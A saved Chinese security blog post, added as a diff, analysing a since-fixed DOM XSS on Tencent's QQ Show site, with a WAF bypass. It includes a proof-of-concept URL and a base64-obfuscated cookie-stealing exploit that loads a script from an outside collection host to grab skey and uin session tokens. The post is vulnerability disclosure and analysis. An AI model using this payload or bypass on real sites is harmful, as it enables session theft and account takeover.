@@ -1,0 +1,293 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>QQ某业务主站DOM XSS挖掘与分析(绕过WAF) | 离别歌</title>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/styles.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/style.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/jquery.min.js"></script>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/code.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/button.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;text=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;title=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;is_video=false&amp;description=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;title=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;title=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;title=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;title=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/QQ-show-dom-xss-analyze.html&amp;name=QQ%E6%9F%90%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AB%99DOM%20XSS%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90%28%E7%BB%95%E8%BF%87WAF%29&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">QQ某业务主站DOM XSS挖掘与分析(绕过WAF)</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年12月27日 23:43" itemprop="datePublished">
+                    2014 十二月 27 23:43
+                </time>
+</div>
+<div class="article-tag">
+            阅读：3568
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/DOMXSS">DOMXSS</a>,
+                
+                <a class="tag-link" href="/tag/xss">xss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>腾讯已经修复了，所以我发出来，贵在挖掘与分析过程。</p>
+<p>可盗取skey与uin全浏览器通用不会被拦截。</p>
+<p>挖掘flashxss的时候偶然发现的，反编译的时候发现这样的URL：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201412/b5441419695101.png"><img alt="QQ秀DOM XSS挖掘与分析97.png" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/b5441419695101.png"/></a></p>
+<p>show.qq.com 属于QQ秀主站业务。</p>
+<p>来到show.html，看到如下代码：</p>
+<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">aNUrl</span><span class="o">=</span> <span class="p">{</span> <span class="s2">"M"</span><span class="o">:</span><span class="s2">"http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html"</span><span class="p">,</span> <span class="s2">"T"</span><span class="o">:</span><span class="s2">"http://imgcache.qq.com/qqshow_v3/htdocs/inc/header.html"</span><span class="p">,</span> <span class="s2">"L"</span><span class="o">:</span><span class="s2">"http://imgcache.qq.com/qqshow_v3/htdocs/inc/sidebar.html"</span> <span class="p">};</span>
+<span class="kd">var</span> <span class="nx">sUrl</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">getURLParam</span><span class="p">(</span><span class="s2">"MUrl"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/http:\/\/show.qq.com/</span><span class="p">,</span><span class="s2">"http://imgcache.qq.com/qqshow_v3/htdocs"</span><span class="p">);</span>
+<span class="p">(</span><span class="nx">sUrl</span> <span class="o">&amp;&amp;</span> <span class="nx">CheckUrlCredit4Frames</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"M"</span><span class="p">]</span><span class="o">=</span><span class="nx">Rel2Abs</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">));</span>
+<span class="kd">var</span> <span class="nx">sUrl</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">getURLParam</span><span class="p">(</span><span class="s2">"LUrl"</span><span class="p">);</span>
+<span class="p">(</span><span class="nx">sUrl</span> <span class="o">&amp;&amp;</span> <span class="nx">CheckUrlCredit4Frames</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"L"</span><span class="p">]</span><span class="o">=</span><span class="nx">Rel2Abs</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">));</span>
+<span class="kd">var</span> <span class="nx">sUrl</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">getURLParam</span><span class="p">(</span><span class="s2">"TUrl"</span><span class="p">);</span>
+<span class="p">(</span><span class="nx">sUrl</span> <span class="o">&amp;&amp;</span> <span class="nx">CheckUrlCredit4Frames</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"T"</span><span class="p">]</span><span class="o">=</span><span class="nx">Rel2Abs</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">));</span>
+<span class="p">...</span>
+<span class="p">...</span>
+<span class="kd">var</span> <span class="nx">uPrm</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"?"</span><span class="p">);</span> <span class="c1">// 从location.href中获得uPrm</span>
+<span class="kd">var</span> <span class="nx">_Prm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="nx">uPrm</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">"&amp;"</span><span class="p">,</span> <span class="s2">"="</span><span class="p">);</span> <span class="c1">// 获得GET参数</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">xName</span> <span class="k">in</span> <span class="nx">_Prm</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">_Prm</span><span class="p">[</span><span class="nx">xName</span><span class="p">])</span><span class="o">==</span><span class="s2">"string"</span> <span class="o">&amp;&amp;</span> <span class="nx">xName</span><span class="o">!=</span><span class="s2">"MUrl"</span> <span class="o">&amp;&amp;</span> <span class="nx">xName</span><span class="o">!=</span><span class="s2">"LUrl"</span> <span class="o">&amp;&amp;</span> <span class="nx">xName</span><span class="o">!=</span><span class="s2">"TUrl"</span><span class="p">)</span>  <span class="c1">// xName是键，_Prm[xName]是值</span>
+    <span class="p">{</span>
+        <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"M"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">setURLParam</span><span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"M"</span><span class="p">],</span> <span class="nx">xName</span><span class="p">,</span> <span class="nx">_Prm</span><span class="p">[</span><span class="nx">xName</span><span class="p">]);</span>
+        <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"L"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">setURLParam</span><span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"L"</span><span class="p">],</span> <span class="nx">xName</span><span class="p">,</span> <span class="nx">_Prm</span><span class="p">[</span><span class="nx">xName</span><span class="p">]);</span>
+        <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"T"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">setURLParam</span><span class="p">(</span><span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"T"</span><span class="p">],</span> <span class="nx">xName</span><span class="p">,</span> <span class="nx">_Prm</span><span class="p">[</span><span class="nx">xName</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">...</span>
+<span class="p">...</span>
+<span class="nx">QSFL</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s2">"headerFrame"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"T"</span><span class="p">];</span>
+<span class="nx">QSFL</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s2">"sideFrame"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"L"</span><span class="p">];</span>
+<span class="nx">QSFL</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s2">"mainFrame"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">aNUrl</span><span class="p">[</span><span class="s2">"M"</span><span class="p">];</span>
+</pre></div>
+<p>上面这三句，很明显是可能会存在xss的。<code>QSFL.$("headerFrame")</code>是一个iframe对象，它的src属性可以为javascript协议，也就是：<code>&lt;iframe src=javascript:alert(1)&gt;</code>。所以只要能控制<code>aNUrl["T"];</code>的前部分，就能造成一个无需交互的DOM XSS。</p>
+<p>要控制<code>aNUrl["T"]</code>，看看之前<code>QSFL.excore.setURLParam</code>函数。<code>QSFL.excore.setURLParam</code>的第一个参数是预置的 <a href="http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html">http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html</a> 、 <a href="http://imgcache.qq.com/qqshow_v3/htdocs/inc/header.html">http://imgcache.qq.com/qqshow_v3/htdocs/inc/header.html</a> 或 <a href="http://imgcache.qq.com/qqshow_v3/htdocs/inc/sidebar.html">http://imgcache.qq.com/qqshow_v3/htdocs/inc/sidebar.html</a> ，第二、三个参数是GET的键和值。</p>
+<p>进入QSFL.excore.setURLParam看看。</p>
+<div class="codehilite"><pre><span></span><span class="nx">QSFL</span><span class="p">.</span><span class="nx">excore</span><span class="p">.</span><span class="nx">setURLParam</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">sUrl</span><span class="p">,</span> <span class="nx">sName</span><span class="p">,</span> <span class="nx">sValue</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="nx">sUrl</span> <span class="o">=</span> <span class="nx">sUrl</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="nx">sName</span> <span class="o">=</span> <span class="nx">sName</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="nx">sValue</span> <span class="o">=</span> <span class="nx">sValue</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">escUrl</span><span class="p">();</span>
+    <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">"(^|\\W)"</span> <span class="o">+</span> <span class="nx">sName</span> <span class="o">+</span> <span class="s2">"=[^&amp;]*"</span><span class="p">,</span> <span class="s2">"g"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">vUrl</span> <span class="o">=</span> <span class="nx">sUrl</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"#"</span><span class="p">);</span>
+    <span class="nx">vUrl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">vUrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">match</span><span class="p">(</span><span class="nx">r</span><span class="p">))</span> <span class="o">?</span> <span class="nx">vUrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="s2">"$1"</span> <span class="o">+</span> <span class="nx">sName</span> <span class="o">+</span> <span class="s2">"="</span> <span class="o">+</span> <span class="nx">sValue</span><span class="p">)</span> <span class="o">:</span> <span class="nx">vUrl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="nx">vUrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"?"</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">?</span> <span class="s2">"?"</span> <span class="o">:</span> <span class="s2">"&amp;"</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sName</span> <span class="o">+</span> <span class="s2">"="</span> 
+    <span class="o">+</span> <span class="nx">sValue</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">vUrl</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">"#"</span><span class="p">);</span>
+<span class="p">};</span>
+</pre></div>
+<p>我们先缕缕思路，这个函数的三个参数，sUrl是我们不能控制的，但sName、sValue都是可以控制的，但其中不能包含&amp;、=。</p>
+<p>我们看到主要部分是一个?:选择符。如果能执行<code>vUrl[0].replace(r, "$1" + sName + "=" + sValue)</code>，因为sName我们可以控制，所以就能控制url的前半部分；如果执行的是<code>vUrl[0] + (vUrl[0].indexOf("?") == -1 ? "?" : "&amp;") + sName + "=" + sValue;</code>，vUrl[0]就是sUrl，我们不能控制前半部分，所以不行。</p>
+<p>所以看看怎样让这个三目运算符执行第一个。看到这个正则：<code>RegExp("(^|\\W)" + sName + "=[^&amp;]*", "g");</code>。将sName放入正则表达式了。</p>
+<p>只要让<code>vUrl[0]</code>匹配上这个正则就可以了，想想怎么办？</p>
+<p>让sName中包含或<code>|</code>就可以了，即为<code>|http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html|</code>，则整个正则为<code>(^|\\W)|http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html|=[^&amp;]*</code>，肯定是可以匹配上 <a href="http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html">http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html</a> 的。</p>
+<p>我们再在sName前面加上<code>javascript:alert(1)//</code>，最后返回的URL即为<code>javascript:alert(1)//|http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html|=1</code>，这样的URL放入iframe的src属性中即可造成一个XSS。<br>
+实际上我发现服务器WAF将会过滤一些关键字，比如javascript:、”等，javascript可以用大小写绕过，引号完全可以不需要，我们可以用//.source代替。</br></p>
+<p>给出一个POC：</p>
+<div class="codehilite"><pre><span></span>http://show.qq.com/show.html?javAScripT:alert(1)//|http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html|=1
+</pre></div>
+<p>可见弹窗：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201412/21fa1419695102.png"><img alt="QQ秀DOM XSS挖掘与分析3380.png" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/21fa1419695102.png"/></a></p>
+<p>写一个盗取cookie的EXP：</p>
+<div class="codehilite"><pre><span></span>http://show.qq.com/show.html?javAScripT:eval(atob(/ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPWh0dHA6Ly94NTUubWh6LnB3L0hZYkJ3VT48L3NjcmlwdD4nKTs/.source))//|http://imgcache.qq.com/qqshow_v3/htdocs/inc/main.html|=1
+</pre></div>
+<p>这个能在chrome下运行。</p>
+<p>经测试可以盗取skey、uin，有这两个就可以登他人空间，干很多邪恶的事情：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201412/39231419695103.png"><img alt="QQ秀DOM XSS挖掘与分析3883.png" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/39231419695103.png"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1953">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/d849d8fe2eea12c7544d2cd6d089e7cc.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">lufei</a>
+<time datetime="2015年3月5日 20:33" itemprop="datePublished">
+                            2015 三月 05 20:33
+                        </time>
+<a href="javascript:reply_to('1953', 'lufei')">回复</a>
+</p>
+<p class="comment-meta">引号完全可以不需要，我们可以用//.source代替。 能详细解释下吗？ 到网上搜了几下没搜到 。。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1954">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年3月5日 21:08" itemprop="datePublished">
+                            2015 三月 05 21:08
+                        </time>
+<a href="javascript:reply_to('1954', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@lufei：//在javascript里是正则对象，.source获取其字符串。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1903">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/4b1401a66f7058d02b706e8cb74c135b.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.baidu.com" target="_blank">呵呵</a>
+<time datetime="2014年12月29日 10:29" itemprop="datePublished">
+                            2014 十二月 29 10:29
+                        </time>
+<a href="javascript:reply_to('1903', '呵呵')">回复</a>
+</p>
+<p class="comment-meta">楼主可牛了....</p>
+</div>
+</div>
+<div class="row" id="comment-1902">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/13ec24073eb64504274a0600c5719038.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">谷粉综合搜索</a>
+<time datetime="2014年12月28日 18:32" itemprop="datePublished">
+                            2014 十二月 28 18:32
+                        </time>
+<a href="javascript:reply_to('1902', '谷粉综合搜索')">回复</a>
+</p>
+<p class="comment-meta">有时加这么多QQ号感觉也没太多用。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="e08d6bc530694a7cd6e644b0d3b21d1f3886512c"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/e08d6bc530694a7cd6e644b0d3b21d1f3886512c"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="341">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="hKxWvXL7pfwnbRfKgURtwjV8x28m4h0kP4SsjrXmQ2qMbwDZ4bld5XXdG6BuNLPu"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./QQ某业务主站DOM XSS挖掘与分析(绕过WAF)  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
